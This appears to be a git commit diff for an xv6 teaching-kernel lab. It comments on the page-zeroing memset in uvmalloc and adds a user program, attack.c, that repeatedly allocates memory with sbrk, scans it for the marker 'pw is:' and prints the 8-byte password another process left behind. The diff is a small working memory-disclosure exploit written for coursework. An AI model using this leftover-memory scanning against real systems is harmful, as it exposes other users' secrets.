cfc267a4973059803c19583c6b40b9ace6773917
Your Name <you@example.com>
2025-09-19 13:21:07 -0600

    done with syscall

--- kernel/vm.c
+++ kernel/vm.c
@@ -269,7 +269,7 @@ uvmalloc(pagetable_t pagetable, uint64 oldsz, uint64 newsz, int xperm)
       return 0;
     }
 #ifndef LAB_SYSCALL
-    memset(mem, 0, sz);
+    memset(mem, 0, sz); //issue
 #endif
     if(mappages(pagetable, a, sz, (uint64)mem, PTE_R|PTE_U|xperm) != 0){
       kfree(mem);
--- user/attack.c
+++ user/attack.c
@@ -3,11 +3,40 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
-int
-main(int argc, char *argv[])
-{
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
+
+int main(void) {
+  int P = 4096;
+
+  const char *sig = "pw is:";  //len 6
+  char secret[8];
+
+  for (int i = 0; i < 20000; i++) {
+    char *p = sbrk(P);
+
+    for (int off = 8; off + 6 <= P; off++) {
+      int check = 0;
+      for (int j = 0; j < 6; j++) {
+        if (p[off + j] != sig[j]) {
+          check = 1;
+          break;
+        }
+      }
+
+    if (!check) {
+      for (int j = 0; j < 8; j++){
+        secret[j] = p[32 + j];
+      }
+      write(2, secret, 8);
+      exit(0);
+      }
+    }
+  }
 
   exit(1);
 }
+
+
+
+
+
+
